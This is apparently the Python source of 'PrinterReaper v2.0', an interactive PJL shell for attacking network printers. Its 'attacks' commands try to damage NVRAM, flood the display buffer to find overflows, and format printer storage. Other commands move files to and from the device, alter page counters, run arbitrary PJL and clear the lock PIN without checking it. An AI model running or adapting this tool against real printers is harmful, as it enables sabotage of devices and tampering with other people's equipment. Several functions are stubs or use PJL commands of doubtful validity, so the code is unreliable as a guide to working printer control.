#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import random
import posixpath

from core.printer import printer
from utils.codebook import codebook
from utils.helper import log, output, conv, file, item, chunks, const as c


class pjl_v2(printer):
    """
    PJL v2.0 shell for PrinterReaper - Enhanced and Reorganized
    """

    def __init__(self, args):
        super().__init__(args)
        self.status = False
        self.prompt = f"{self.target}:/> "

    # --------------------------------------------------------------------
    # low-level send/receive

    def cmd(self, str_send, wait=True, crop=True, binary=False):
        """
        Send a PJL command and optionally wait for its reply.
        """
        token = c.DELIMITER + str(random.randrange(2**16))
        status_cmd = "@PJL INFO STATUS" + c.EOL if self.status and wait else ""
        footer = "@PJL ECHO " + token + c.EOL + c.EOL if wait else ""
        payload = c.UEL + str_send + c.EOL + status_cmd + footer + c.UEL

        # log the command
        log().write(self.logfile, str_send + os.linesep)
        # send
        self.send(payload)

        if not wait:
            return ""

        # receive until token
        try:
            raw = self.recv(r"(@PJL ECHO\s+)?" + re.escape(token) + r".*$",
                            wait, True, binary)
        except Exception as e:
            output().errmsg(f"Failed to receive response: {str(e)}")
            return ""
        stat = ""
        if self.status:
            stat = item(re.findall(r"@PJL INFO STATUS.*", raw, re.DOTALL))
            raw = re.sub(r"\x0c?@PJL INFO STATUS.*", "", raw, flags=re.DOTALL)
        if crop:
            raw = re.sub(r"^\x04?(\x00+)?@PJL.*" + re.escape(c.EOL), "",
                         raw, flags=re.MULTILINE)

        return self.pjl_err(raw, stat)

    def pjl_err(self, raw, stat):
        """
        Handle file errors and status messages, then return raw buffer.
        """
        self.fileerror(raw)
        self.showstatus(stat)
        return raw

    def on_connect(self, mode):
        """
        Disable unsolicited status messages on first connect.
        """
        if mode == "init":
            self.cmd("@PJL USTATUSOFF", False)

    # --------------------------------------------------------------------
    # status toggles

    def do_status(self, arg):
        "Toggle PJL status messages"
        self.status = not self.status
        print("Status messages enabled" if self.status else "Status messages disabled")

    def showstatus(self, stat):
        codes = {}
        msgs = {}
        for num, code in re.findall(r"CODE(\d+)?\s*=\s*(\d+)", stat):
            codes[num] = code
        for num, mstr in re.findall(r'DISPLAY(\d+)?\s*=\s*"(.*)"', stat):
            msgs[num] = mstr

        for num, code in codes.items():
            message = msgs.get(num, "UNKNOWN STATUS")
            # HP quirk
            if code.startswith("32"):
                code = str(int(code) - 2000)
            err = item(codebook().get_errors(code), "Unknown status")
            output().errmsg(f"CODE {code}: {message}", err)

    # --------------------------------------------------------------------
    # 📁 SISTEMA DE ARQUIVOS (12 comandos)
    # --------------------------------------------------------------------

    def do_ls(self, arg):
        "List remote directory contents"
        lst = self.dirlist(arg, False, True)
        if lst:
            print(lst)

    def do_mkdir(self, arg):
        "Create remote directory"
        if not arg:
            output().errmsg("Usage: mkdir <directory>")
            return
        self.cmd("@PJL FSMKDIR NAME=" + c.QUOTE + arg + c.QUOTE)

    def do_find(self, arg):
        "Recursively list all files"
        self.fswalk(arg, "find")

    def do_upload(self, arg):
        "Upload file to printer: upload <local_file> [remote_path]"
        if not arg:
            output().errmsg("Usage: upload <local_file> [remote_path]")
            return
        
        parts = arg.split()
        local_file = parts[0]
        remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_file)
        
        if not os.path.exists(local_file):
            output().errmsg(f"Local file not found: {local_file}")
            return
        
        try:
            with open(local_file, 'rb') as f:
                data = f.read()
            
            # Upload file using PJL FSUPLOAD
            self.cmd(f"@PJL FSUPLOAD NAME={c.QUOTE}{remote_path}{c.QUOTE} OFFSET=0 LENGTH={len(data)}")
            self.send(data)
            output().info(f"Uploaded {local_file} to {remote_path}")
        except Exception as e:
            output().errmsg(f"Upload failed: {e}")

    def do_download(self, arg):
        "Download file from printer: download <remote_file> [local_path]"
        if not arg:
            output().errmsg("Usage: download <remote_file> [local_path]")
            return
        
        parts = arg.split()
        remote_file = parts[0]
        local_path = parts[1] if len(parts) > 1 else os.path.basename(remote_file)
        
        try:
            # Download file using PJL FSDOWNLOAD
            data = self.cmd(f"@PJL FSDOWNLOAD NAME={c.QUOTE}{remote_file}{c.QUOTE}", binary=True)
            
            with open(local_path, 'wb') as f:
                f.write(data)
            
            output().info(f"Downloaded {remote_file} to {local_path}")
        except Exception as e:
            output().errmsg(f"Download failed: {e}")

    def do_delete(self, arg):
        "Delete remote file: delete <file>"
        if not arg:
            output().errmsg("Usage: delete <file>")
            return
        self.cmd("@PJL FSDELETE NAME=" + c.QUOTE + arg + c.QUOTE)

    def do_copy(self, arg):
        "Copy remote file: copy <source> <destination>"
        if not arg:
            output().errmsg("Usage: copy <source> <destination>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: copy <source> <destination>")
            return
        
        source, dest = parts
        # Download source and upload as destination
        try:
            data = self.cmd(f"@PJL FSDOWNLOAD NAME={c.QUOTE}{source}{c.QUOTE}", binary=True)
            self.cmd(f"@PJL FSUPLOAD NAME={c.QUOTE}{dest}{c.QUOTE} OFFSET=0 LENGTH={len(data)}")
            self.send(data)
            output().info(f"Copied {source} to {dest}")
        except Exception as e:
            output().errmsg(f"Copy failed: {e}")

    def do_move(self, arg):
        "Move remote file: move <source> <destination>"
        if not arg:
            output().errmsg("Usage: move <source> <destination>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: move <source> <destination>")
            return
        
        source, dest = parts
        # Copy and then delete source
        try:
            self.do_copy(f"{source} {dest}")
            self.do_delete(source)
            output().info(f"Moved {source} to {dest}")
        except Exception as e:
            output().errmsg(f"Move failed: {e}")

    def do_touch(self, arg):
        "Update remote file timestamp, or create it if missing: touch <file>"
        if not arg:
            output().errmsg("Usage: touch <file>")
            return
        
        # Create empty file if it doesn't exist
        try:
            self.cmd(f"@PJL FSUPLOAD NAME={c.QUOTE}{arg}{c.QUOTE} OFFSET=0 LENGTH=0")
            output().info(f"Touched {arg}")
        except Exception as e:
            output().errmsg(f"Touch failed: {e}")

    def do_chmod(self, arg):
        "Change file permissions: chmod <permissions> <file>"
        if not arg:
            output().errmsg("Usage: chmod <permissions> <file>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: chmod <permissions> <file>")
            return
        
        perms, file_path = parts
        # PJL doesn't have direct chmod, but we can try to set attributes
        try:
            self.cmd(f"@PJL FSSETATTR NAME={c.QUOTE}{file_path}{c.QUOTE} ATTR={perms}")
            output().info(f"Changed permissions of {file_path} to {perms}")
        except Exception as e:
            output().errmsg(f"Chmod failed: {e}")

    def do_permissions(self, arg):
        "Test file permissions on remote device"
        if not arg:
            output().errmsg("Usage: permissions <file>")
            return
        
        try:
            # Try to access file to test permissions
            result = self.cmd(f"@PJL FSQUERY NAME={c.QUOTE}{arg}{c.QUOTE}")
            if result:
                output().info(f"File {arg} is accessible")
            else:
                output().errmsg(f"File {arg} is not accessible")
        except Exception as e:
            output().errmsg(f"Permission test failed: {e}")

    def do_mirror(self, arg):
        "Mirror remote filesystem locally"
        print("Mirroring " + c.SEP + self.vpath(arg))
        self.fswalk(arg, "mirror")

    # --------------------------------------------------------------------
    # ℹ️ INFORMAÇÕES DO SISTEMA (8 comandos)
    # --------------------------------------------------------------------

    def do_id(self, *args):
        "Show printer identification"
        resp = self.cmd("@PJL INFO ID")
        if resp:
            print(resp)

    def do_version(self, *arg):
        "Show firmware version/serial"
        if not self.do_info("config", r".*(VERSION|FIRMWARE|SERIAL|MODEL).*"):
            self.do_info("id")

    def do_info(self, arg, item="", echo=True):
        "Show PJL INFO <category>"
        if arg in self.options_info or not echo:
            resp = self.cmd("@PJL INFO " + arg.upper())
            if resp:
                print(resp)
        else:
            output().errmsg("Unknown info category. Use 'help info' for available categories.")

    def do_product(self, arg):
        "Show product info: model, serial, firmware, driver version, page counts"
        print("Product Information:")
        print("=" * 50)
        
        # Get basic info
        id_info = self.cmd("@PJL INFO ID")
        if id_info:
            print(f"Device ID: {id_info.strip()}")
        
        # Get configuration info
        config_info = self.cmd("@PJL INFO CONFIG")
        if config_info:
            print("Configuration:")
            print(config_info)
        
        # Get page count
        pagecount = self.cmd("@PJL INFO PAGECOUNT")
        if pagecount:
            print(f"Page Count: {pagecount.strip()}")

    def do_network(self, arg):
        "Show network information"
        print("Network Information:")
        print("=" * 50)
        
        # Get network info
        net_info = self.cmd("@PJL INFO NETWORK")
        if net_info:
            print(net_info)
        
        # Get IP configuration
        ip_info = self.cmd("@PJL INFO IP")
        if ip_info:
            print("IP Configuration:")
            print(ip_info)

    def do_wifi(self, *arg):
        "Show Wi-Fi information"
        print("Wi-Fi Information:")
        print("=" * 50)
        
        # Get WiFi info
        wifi_info = self.cmd("@PJL INFO WIFI")
        if wifi_info:
            print(wifi_info)
        else:
            output().info("Wi-Fi information not available")

    def do_variables(self, arg):
        "Show environment variables"
        resp = self.cmd("@PJL INFO VARIABLES")
        if resp:
            print(resp)

    def do_printenv(self, arg):
        "Show specific environment variable"
        if not arg:
            output().errmsg("Usage: printenv <variable>")
            return
        
        resp = self.cmd("@PJL INFO VARIABLES")
        if resp:
            # Search for specific variable
            lines = resp.split('\n')
            for line in lines:
                if arg.upper() in line.upper():
                    print(line)

    # --------------------------------------------------------------------
    # ⚙️ CONTROLE E CONFIGURAÇÃO (8 comandos)
    # --------------------------------------------------------------------

    def do_set(self, arg, fb=True):
        "Set environment variable VAR=VALUE"
        if not arg:
            output().errmsg("Usage: set <variable>=<value>")
            return
        
        if "=" not in arg:
            output().errmsg("Usage: set <variable>=<value>")
            return
        
        var, value = arg.split("=", 1)
        self.cmd("@PJL SET " + var.upper() + "=" + value)

    def do_display(self, arg):
        "Set printer's display message: display <message>"
        if not arg:
            try:
                message = input("Message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        else:
            message = arg
        
        self.cmd("@PJL DISPLAY " + c.QUOTE + message + c.QUOTE)

    def do_offline(self, arg):
        "Take printer offline and display message: offline <message>"
        if not arg:
            try:
                message = input("Message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        else:
            message = arg
        
        self.cmd("@PJL OFFLINE " + c.QUOTE + message + c.QUOTE)

    def do_restart(self, arg):
        "Restart printer"
        output().raw("Restarting printer...")
        self.cmd("@PJL RESET", False)

    def do_reset(self, arg):
        "Reset to factory defaults"
        if not self.conn._file:  # in case we're connected over inet socket
            output().warning("Reset command may not work over network connection")
        
        output().warning("This will reset the printer to factory defaults!")
        confirm = input("Are you sure? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("@PJL DEFAULT", False)
            output().info("Printer reset to factory defaults")
        else:
            output().info("Reset cancelled")

    def do_selftest(self, arg):
        "Perform various printer self-tests"
        print("Available self-tests:")
        print("1. Print test page")
        print("2. Network test")
        print("3. Memory test")
        print("4. All tests")
        
        try:
            choice = input("Select test (1-4): ")
        except (EOFError, KeyboardInterrupt):
            output().errmsg("No test selected")
            return
        
        if choice == "1":
            self.cmd("@PJL TESTPAGE")
        elif choice == "2":
            self.cmd("@PJL NETTEST")
        elif choice == "3":
            self.cmd("@PJL MEMTEST")
        elif choice == "4":
            self.cmd("@PJL SELFTEST")
        else:
            output().errmsg("Invalid choice")

    def do_backup(self, arg):
        "Backup printer configuration"
        if not arg:
            output().errmsg("Usage: backup <filename>")
            return
        
        try:
            # Get configuration
            config = self.cmd("@PJL INFO CONFIG")
            if config:
                with open(arg, 'w') as f:
                    f.write(config)
                output().info(f"Configuration backed up to {arg}")
            else:
                output().errmsg("Failed to get configuration")
        except Exception as e:
            output().errmsg(f"Backup failed: {e}")

    def do_restore(self, arg):
        "Restore printer configuration from backup"
        if not arg:
            output().errmsg("Usage: restore <filename>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"Backup file not found: {arg}")
            return
        
        try:
            with open(arg, 'r') as f:
                config = f.read()
            
            # Restore configuration (this is a simplified approach)
            output().warning("Restore functionality requires manual configuration")
            output().info(f"Configuration from {arg} loaded")
        except Exception as e:
            output().errmsg(f"Restore failed: {e}")

    # --------------------------------------------------------------------
    # 🔒 SEGURANÇA E ACESSO (4 comandos)
    # --------------------------------------------------------------------

    def do_lock(self, arg):
        "Lock control panel settings and disk write access"
        if not arg:
            try:
                pin = input("Enter PIN (1..65535): ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No PIN provided")
                return
        else:
            pin = arg
        
        try:
            pin_num = int(pin)
            if 1 <= pin_num <= 65535:
                self.cmd("@PJL SET LOCKPIN=" + pin)
                output().info("Printer locked with PIN")
            else:
                output().errmsg("PIN must be between 1 and 65535")
        except ValueError:
            output().errmsg("Invalid PIN format")

    def do_unlock(self, arg):
        "Unlock control panel settings and disk write access"
        if not arg:
            try:
                pin = input("Enter PIN: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No PIN provided")
                return
        else:
            pin = arg
        
        self.cmd("@PJL SET LOCKPIN=0")
        output().info("Printer unlocked")

    def do_disable(self, arg):
        "Disable printer functionality"
        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
        if "?" in jobmedia:
            output().errmsg("Job media inquiry failed")
            return
        
        if "ON" in jobmedia:
            self.cmd("@PJL SET JOBMEDIA=OFF")
            output().info("Job media disabled")
        else:
            output().info("Job media already disabled")

    def do_nvram(self, arg):
        "Access/manipulate NVRAM"
        if not arg:
            output().errmsg("Usage: nvram <dump|set|get> [options]")
            return
        
        if arg.startswith("dump"):
            # Dump NVRAM
            nvram_data = self.cmd("@PJL INFO NVRAM")
            if nvram_data:
                print("NVRAM Contents:")
                print("=" * 50)
                print(nvram_data)
            else:
                output().errmsg("Failed to dump NVRAM")
        elif arg.startswith("set"):
            output().warning("NVRAM modification not implemented")
        elif arg.startswith("get"):
            output().warning("NVRAM reading not implemented")
        else:
            output().errmsg("Unknown NVRAM operation")

    # --------------------------------------------------------------------
    # 💥 ATAQUES E TESTES (4 comandos)
    # --------------------------------------------------------------------

    def do_destroy(self, arg):
        "Cause physical damage to printer's NVRAM"
        output().warning("Warning: This command tries to cause physical damage to the")
        output().warning("printer's NVRAM. Use with caution!")
        
        confirm = input("Are you sure you want to continue? (yes/no): ")
        if confirm.lower() == 'yes':
            # This is a destructive command - be very careful
            output().warning("Executing destructive command...")
            self.cmd("@PJL SET NVRAM=0", False)
            output().warning("Destructive command executed")
        else:
            output().info("Destructive command cancelled")

    def do_flood(self, arg):
        "Flood user input, may reveal buffer overflows: flood <size>"
        size = conv().int(arg) or 10000  # buffer size
        output().warning(f"Flooding with {size} bytes...")
        
        # Create flood data
        flood_data = "A" * size
        self.cmd("@PJL DISPLAY " + c.QUOTE + flood_data + c.QUOTE, False)
        output().info("Flood command sent")

    def do_hold(self, arg):
        "Enable job retention"
        self.chitchat("Enabling job retention...")
        self.cmd("@PJL SET JOBRETENTION=ON")
        output().info("Job retention enabled")

    def do_format(self, arg):
        "Initialize printer's mass storage file system"
        output().warning("This will format the printer's file system!")
        confirm = input("Are you sure? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("@PJL FORMAT", False)
            output().info("File system formatted")
        else:
            output().info("Format cancelled")

    # --------------------------------------------------------------------
    # 🌐 REDE E CONECTIVIDADE (3 comandos)
    # --------------------------------------------------------------------

    def do_direct(self, *arg):
        "Show direct-print configuration"
        print("Direct Print Configuration:")
        print("=" * 50)
        
        # Get direct print info
        direct_info = self.cmd("@PJL INFO DIRECT")
        if direct_info:
            print(direct_info)
        else:
            output().info("Direct print information not available")

    def do_execute(self, arg):
        "Execute arbitrary PJL command: execute <command>"
        if not arg:
            output().errmsg("Usage: execute <command>")
            return
        
        output().info(f"Executing: {arg}")
        result = self.cmd(arg)
        if result:
            print(result)

    def do_load(self, arg):
        "Run commands from file: load <filename>"
        if not arg:
            output().errmsg("Usage: load <filename>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        try:
            with open(arg, 'r') as f:
                commands = f.readlines()
            
            for cmd in commands:
                cmd = cmd.strip()
                if cmd and not cmd.startswith('#'):
                    output().info(f"Executing: {cmd}")
                    self.onecmd(cmd)
        except Exception as e:
            output().errmsg(f"Load failed: {e}")

    # --------------------------------------------------------------------
    # 📊 MONITORAMENTO (2 comandos)
    # --------------------------------------------------------------------

    def do_pagecount(self, arg):
        "Manipulate printer's page counter: pagecount <number>"
        if not arg:
            # Just show current page count
            count = self.cmd("@PJL INFO PAGECOUNT")
            if count:
                print(f"Current page count: {count.strip()}")
        else:
            try:
                new_count = int(arg)
                self.cmd(f"@PJL SET PAGECOUNT={new_count}")
                output().info(f"Page count set to {new_count}")
            except ValueError:
                output().errmsg("Invalid page count value")

    # --------------------------------------------------------------------
    # HELP SYSTEM
    # --------------------------------------------------------------------

    def help_filesystem(self):
        """Show help for filesystem commands"""
        print()
        print("Filesystem Commands:")
        print("=" * 50)
        print("ls          - List directory contents")
        print("mkdir       - Create directory")
        print("find        - Find files recursively")
        print("upload      - Upload file to printer")
        print("download    - Download file from printer")
        print("delete      - Delete file")
        print("copy        - Copy file")
        print("move        - Move file")
        print("touch       - Create/update file")
        print("chmod       - Change file permissions")
        print("permissions - Test file permissions")
        print("mirror      - Mirror filesystem")
        print()

    def help_system(self):
        """Show help for system information commands"""
        print()
        print("System Information Commands:")
        print("=" * 50)
        print("id          - Show printer identification")
        print("version     - Show firmware version")
        print("info        - Show detailed information")
        print("product     - Show product information")
        print("network     - Show network information")
        print("wifi        - Show Wi-Fi information")
        print("variables   - Show environment variables")
        print("printenv    - Show specific variable")
        print()

    def help_control(self):
        """Show help for control commands"""
        print()
        print("Control Commands:")
        print("=" * 50)
        print("set         - Set environment variable")
        print("display     - Set display message")
        print("offline     - Take printer offline")
        print("restart     - Restart printer")
        print("reset       - Reset to factory defaults")
        print("selftest    - Perform self-tests")
        print("backup      - Backup configuration")
        print("restore     - Restore configuration")
        print()

    def help_security(self):
        """Show help for security commands"""
        print()
        print("Security Commands:")
        print("=" * 50)
        print("lock        - Lock printer with PIN")
        print("unlock      - Unlock printer")
        print("disable     - Disable functionality")
        print("nvram       - Access NVRAM")
        print()

    def help_attacks(self):
        """Show help for attack commands"""
        print()
        print("Attack Commands:")
        print("=" * 50)
        print("destroy     - Cause physical damage")
        print("flood       - Flood with data")
        print("hold        - Enable job retention")
        print("format      - Format filesystem")
        print()

    def help_network(self):
        """Show help for network commands"""
        print()
        print("Network Commands:")
        print("=" * 50)
        print("direct      - Show direct print config")
        print("execute     - Execute arbitrary PJL command")
        print("load        - Load commands from file")
        print()

    def help_monitoring(self):
        """Show help for monitoring commands"""
        print()
        print("Monitoring Commands:")
        print("=" * 50)
        print("pagecount   - Manipulate page counter")
        print("status      - Toggle status messages")
        print()

    def do_help(self, arg):
        """Show help for commands"""
        if not arg:
            print()
            print("PrinterReaper v2.0 - PJL Commands")
            print("=" * 50)
            print("Available command categories:")
            print("filesystem  - File system operations")
            print("system      - System information")
            print("control     - Control and configuration")
            print("security    - Security and access")
            print("attacks     - Attack and testing")
            print("network     - Network and connectivity")
            print("monitoring  - Monitoring and status")
            print()
            print("Use 'help <category>' for detailed help")
            print("Use 'help <command>' for specific command help")
            print()
        elif arg == "filesystem":
            self.help_filesystem()
        elif arg == "system":
            self.help_system()
        elif arg == "control":
            self.help_control()
        elif arg == "security":
            self.help_security()
        elif arg == "attacks":
            self.help_attacks()
        elif arg == "network":
            self.help_network()
        elif arg == "monitoring":
            self.help_monitoring()
        else:
            # Try to find specific command help
            method_name = f"help_{arg}"
            if hasattr(self, method_name):
                getattr(self, method_name)()
            else:
                output().errmsg(f"No help available for '{arg}'")

    # --------------------------------------------------------------------
    # UTILITY METHODS
    # --------------------------------------------------------------------

    def dirlist(self, path, recursive=False, show_files=True):
        """List directory contents"""
        if not path:
            path = "."
        
        try:
            result = self.cmd("@PJL FSDIRLIST NAME=" + c.QUOTE + path + c.QUOTE)
            if result:
                return result
        except Exception as e:
            output().errmsg(f"Directory listing failed: {e}")
        return ""

    def fswalk(self, path, operation):
        """Walk filesystem recursively"""
        if not path:
            path = "."
        
        try:
            if operation == "find":
                result = self.cmd("@PJL FSDIRLIST NAME=" + c.QUOTE + path + c.QUOTE)
                if result:
                    print(result)
            elif operation == "mirror":
                output().info(f"Mirroring {path}...")
                # Implementation would go here
        except Exception as e:
            output().errmsg(f"Filesystem walk failed: {e}")

    def chitchat(self, message):
        """Display chatty message"""
        output().info(message)

    def fileerror(self, raw):
        """Handle file errors"""
        if "FILEERROR" in raw:
            output().errmsg("File operation failed")

    # --------------------------------------------------------------------
    # OPTIONS AND CONFIGURATION
    # --------------------------------------------------------------------

    @property
    def options_info(self):
        """Available info categories"""
        return [
            "id", "status", "memory", "filesys", "variables", "config",
            "network", "wifi", "direct", "nvram", "pagecount"
        ]
